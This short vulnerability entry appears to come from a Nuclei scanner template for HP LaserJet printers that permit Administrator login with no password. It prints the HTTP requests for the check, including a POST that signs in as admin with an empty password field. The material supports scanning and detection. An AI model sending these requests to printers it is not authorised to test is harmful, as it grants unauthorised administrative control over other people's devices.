# Vulnerability: Hewlett Packard LaserJet Printer - Default Login
**Classification:** HP
**Source:** Nuclei Template (`hp-printer-default-login.yaml`)

## Description
HP printers often allow administrative access without requiring a password by default. This behavior enables anyone to log in as the Administrator without authentication, potentially exposing sensitive settings or functions.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /hp/device/SignIn/Index HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: identity
Accept-Language: en

POST /hp/device/SignIn/Index HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: identity
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}/hp/device/SignIn/Index

CSRFToken={{token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
```

